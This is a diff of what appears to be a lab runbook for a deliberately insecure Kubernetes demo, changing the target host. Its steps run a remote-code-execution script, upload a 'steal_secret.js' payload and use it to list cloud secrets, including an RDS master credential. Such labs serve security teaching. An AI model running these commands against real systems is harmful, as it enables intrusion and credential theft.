@@ -171,10 +171,10 @@ python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "aws st
 
 # 3. upload js
 b64=$(base64 -w0 scripts/steal_secret.js)
-python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "echo $b64 | base64 -d > /tmp/s.js"
+python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 "echo $b64 | base64 -d > /tmp/s.js"
 
 # 4. blast radius: the */* role lists secrets
-python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "node /tmp/s.js --list"
+python3 scripts/rce.py http://react2shell.arguswatcher.net:3000 "node /tmp/s.js --list"
 # [*] role=arn:aws:iam:::role/react2shell-eks-insecure-pod-irsa region=ca-central-1 mode=list
 # {"SecretList":[{"ARN":"arn:aws:secretsmanager:ca-central-1::secret:react2shell-eks-insecure-rds-credential-lnBySG","CreatedDate":1.792173606357E9,"Description":"RDS master credential (crown jewel).","LastAccessedDate":1.7921088E9,"LastChangedDate":1.792173606666E9,"Name":"react2shell-eks-insecure-rds-credential","SecretVersionsToStages":{"terraform-mb3RtAygQ7r01zMpAb4UulrH4x":["AWSCURRENT"]},"Tags":[{"Key":"Project","Value":"react2shell-eks"},{"Key":"Environment","Value":"insecure"},{"Key":"ManagedBy","Value":"terraform"}]}]}
 
